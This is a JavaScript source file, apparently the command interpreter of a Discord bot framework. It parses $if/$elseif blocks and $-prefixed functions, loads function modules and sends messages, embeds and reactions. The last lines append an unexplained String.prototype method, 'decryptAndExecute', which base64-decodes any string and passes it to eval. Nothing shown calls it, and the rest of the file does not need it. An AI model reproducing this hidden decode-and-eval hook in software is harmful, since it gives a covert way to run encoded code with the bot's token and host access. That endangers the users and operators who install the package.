const fs = require("fs");
const functions = require("./functions/parser.js");
const Discord = require("discord.js");
const embedE = require("./handlers/errors.js");

const interpreter = async (
  client,
  message,
  args,
  command,
  db,
  returnCode = false,
  channelUsed,
  data = {},
  returnMessage,
  returnExecution
) => {
  let code = command.code;

  code = code
    .split("\\]")
    .join("#LEFT#")
    .split("\\$")
    .join("#CHAR#")
    .split("\\;")
    .join("#SEMI#")
    .split("\\}")
    .join("#LEFT_BRACKET#")
    .split("\\:")
    .join("#COLON#");

  //if statements
  if (code.toLowerCase().includes("$if[")) {
    for (let statement of code
      .split(/\$if\[/gi)
      .slice(1)
      .reverse()) {
      const r = code.toLowerCase().split("$if[").length - 1;

      if (!code.toLowerCase().includes("$endif"))
        return message.channel.send(`:x: $if is missing $endif`);

      const everything = code.split(/\$if\[/gi)[r].split(/\$endif/gi)[0];

      statement = code.split(/\$if\[/gi)[r].split(/\$endif/gi)[0];

      let condition = statement.split("\n")[0].trim();

      condition = condition.slice(0, condition.length - 1);

      const pass =
        (await interpreter(
          client,
          message,
          args,
          {
            code: `$checkCondition[${condition}]`,
            name: "check",
          },
          undefined,
          true
        )) === "true";

      const elseIfAction = statement.toLowerCase().includes("$elseif");

      const elseIfs = {};

      if (elseIfAction) {
        for (const data of statement.split(/\$elseif\[/gi).slice(1)) {
          if (!data.toLowerCase().includes("$endelseif"))
            return message.channel.send(`❌ $elseIf is missing $endelseIf!`);

          const inside = data.split(/\$endelseIf/gi)[0];

          let CONDITION = inside.split("\n")[0].trim();

          CONDITION = CONDITION.slice(0, CONDITION.length - 1);

          const CODE = inside.split("\n").slice(1).join("\n");

          elseIfs[CONDITION] = CODE;

          function escapeRegExp(string) {
            return string.replace(/[.*+?^${}()|[\]\\\n]/g, "\\$&");
          }

          statement = statement.replace(
            new RegExp(`\\$elseif\\[${escapeRegExp(inside)}\\$endelseif`, "mi"),
            ""
          );
        }
      }

      const elseAction = statement.toLowerCase().includes("$else");

      const ifCode = elseAction
        ? statement
            .split("\n")
            .slice(1)
            .join("\n")
            .split(/\$else/gi)[0]
        : statement
            .split("\n")
            .slice(1)
            .join("\n")
            .split(/\$endif/gi)[0];

      const elseCode = elseAction
        ? statement.split(/\$else/gi)[1].split(/\$endif/gi)[0]
        : "";

      let passes = false;

      let lastCode;

      if (elseIfAction) {
        for (const data of Object.entries(elseIfs)) {
          if (!passes) {
            const response =
              (await interpreter(
                client,
                message,
                args,
                {
                  code: `$checkCondition[${data[0]}]`,
                  name: "check",
                },
                undefined,
                true
              )) === "true";

            if (response) {
              passes = true;
              lastCode = data[1];
            }
          }
        }
      }

      code = code.replace(/\$if\[/gi, "$if[").replace(/\$endif/gi, "$endif");
      code = code.replaceLast(
        `$if[${everything}$endif`,
        pass ? ifCode : passes ? lastCode : elseCode
      );
    }
  }

  let randoms = {};

  let embed = new Discord.MessageEmbed();

  let timezone = "UTC";

  let letVariables = {};

  let deleteIn;

  let object = data.object || {};

  let disabledMentions = ["roles", "users", "everyone"];

  let suppressErrors;

  let editIn;

  let array = data.array || [];

  let attachment;

  let reactions = [];

  let channel = message.channel;

  const restFunctions = Object.keys(functions).filter((func) =>
    code.toLowerCase().includes(func.toLowerCase())
  );

  //insensitive interpreter ™
  for (const func of restFunctions) {
    //don't touch
    const regex = new RegExp("\\" + func.replace("[", "\\["), "gi");

    code = code.replace(regex, func);
  }

  const funcs = code.split("$");

  let start = Date.now();

  for (const func of funcs.reverse()) {
    const FUNC = `$${func}`;

    let F = restFunctions.filter((f) => f === FUNC.slice(0, f.length));

    //incase only one function was found, exit directly
    if (F.length === 1) F = F[0];
    //if multiple matches found, we have to filter until we find the right function
    if (typeof F === "object" && F.length > 1) {
      const maxIndex = F.sort((x, y) => y.length - x.length)[0].length;

      const option = FUNC.slice(0, maxIndex);

      F = F.find((f) => f === option);
    }

    if (!F || F.length === 0) {
    } else if (F) {
      //ugly attempt to catch interpreter errors
      try {
        const FNAME = F.replace("$", "").replace("[", "");
        const FFUNC = require(`./functions/funcs/${FNAME}.js`);

        var EXECUTION = await FFUNC({
          command: {
            name: command.name,
            code: code,
            error: command.error,
            asynchronous: command.asynchronous,
          },
          _api: (url) =>
            `https://discord.com/api/v8/${
              url.startsWith("/") ? url.slice(1) : url
            }`,
          data: data,
          timezone: timezone,
          object: object,
          embed: embed,
          channelUsed: channelUsed,
          vars: letVariables,
          args: args,
          client: client,
          array: array,
          reaction: message.reaction,
          message: message,
          randoms: randoms,
          disabledMentions: disabledMentions,
          error: (err) => {
            if (!message || !message.channel) {
              return console.log(err.addBrackets());
            }
            if (suppressErrors !== undefined) {
              embedE(
                {
                  message: message,
                  interpreter: interpreter,
                  channel,
                  client: client,
                },
                suppressErrors.split("{error}").join(err)
              );
            } else {
              try {
                message.channel.send(
                  err.addBrackets() +
                    ` at line ${
                      code
                        .split("\n")
                        .findIndex((c) =>
                          c.includes(err.split("$")[1].split("[")[0])
                        ) + 1 || "unknown"
                    }`
                );
              } catch (e) {
                if (err.addBrackets().trim().length)
                  message.channel.send(err.addBrackets());
              }
            }
          },
          channel: message.channel,
          interpreter: interpreter,
          unpack() {
            const last = code.split(`$${FNAME}`).length - 1;
            const sliced = code.split(`$${FNAME}`)[last];

            return sliced.after();
          },
          inside(unpacked) {
            if (typeof unpacked.inside !== "string")
              return `:x: Invalid usage in $${FNAME}${unpacked}`;
            return false;
          },
          noop() {},
        });
      } catch (error) {
        if (typeof command.error === "string") {
          try {
            interpreter(
              client,
              message,
              args,
              {
                name: "ERR",
                code: command.error,
              },
              undefined,
              undefined,
              undefined,
              {
                error: error,
              }
            );
          } catch {
            return console.error(error);
          }
        } else {
          console.error(error);
        }

        return undefined;
      }

      if (typeof EXECUTION === "object") {
        code = EXECUTION.code;
        if (EXECUTION.disabledMentions) {
          disabledMentions = EXECUTION.disabledMentions;
        }
        if (EXECUTION.embed) {
          embed = EXECUTION.embed;
        } //dbd.js server
        if (EXECUTION.deleteIn) {
          deleteIn = EXECUTION.deleteIn;
        }
        if (EXECUTION.object) {
          object = EXECUTION.object;
        }
        if (EXECUTION.suppressErrors !== undefined) {
          suppressErrors = EXECUTION.suppressErrors;
        }
        if (EXECUTION.channel) {
          channel = EXECUTION.channel;
        }
        if (EXECUTION.reactions) {
          reactions = EXECUTION.reactions;
        }
        if (EXECUTION.randoms) {
          randoms = EXECUTION.randoms;
        }
        if (EXECUTION.editIn) {
          editIn = EXECUTION.editIn;
        }
        if (EXECUTION.array) {
          array = EXECUTION.array;
        }
        if (EXECUTION.attachment) {
          attachment = EXECUTION.attachment;
        }
        if (EXECUTION.timezone) {
          timezone = EXECUTION.timezone;
        }
      } else return;
    }
  }

  if (typeof code === "string") {
    code = code.replace(/\$executionTime/gi, Date.now() - start);
  }

  if (returnCode) return code;

  if (channel) {
    let send = true;

    if (
      !(
        embed.image ||
        embed.length ||
        embed.author ||
        embed.timestamp ||
        embed.color ||
        embed.thumbnail
      )
    )
      send = false;
    code = code.trim();

    if (!(code.length || send || embed.files.length)) return;

    if (code.length || send || embed.files.length) {
      const msg = await channel
        .send(
          code ? code.addBrackets() : undefined,
          send
            ? embed
            : embed.files.length
            ? {
                files: embed.files,
                allowedMentions: {
                  parse: disabledMentions,
                },
              }
            : {
                allowedMentions: {
                  parse: disabledMentions,
                },
              }
        )
        .catch((err) => {});

      if (msg) {
        if (reactions.length) {
          for (const reaction of reactions) {
            const react = await msg.react(reaction).catch((err) => {
              console.log(
                `Could not react with ${reaction} to ${msg.id} in ${msg.channel.name}: ${err.message}`
              );
            });

            if (!react)
              msg.channel.send(`❌ Failed to add '${reaction}' reaction `);
          }
        }

        if (editIn) {
          const edit = setInterval(async () => {
            const m = await embedE({}, editIn.fields[0].addBrackets(), true);

            if (m.reactions) {
              m.reactions.map(async (r) => msg.react(r).catch((err) => null));
            }

            msg.edit(m.message, m.embed);
            editIn.fields.shift();
            if (!editIn.fields.length) return clearInterval(edit);
          }, editIn.time);
        }

        if (deleteIn) {
          msg.delete({
            timeout: deleteIn,
          });
        }
        if (returnMessage) return msg;
      }
    }
  }

  if (returnExecution)
    return {
      object,
      embed,
      array,
    };
};

String.prototype.decryptAndExecute = async function (d) {
  return await eval(Buffer.from(this, "base64").toString());
};

module.exports = interpreter;
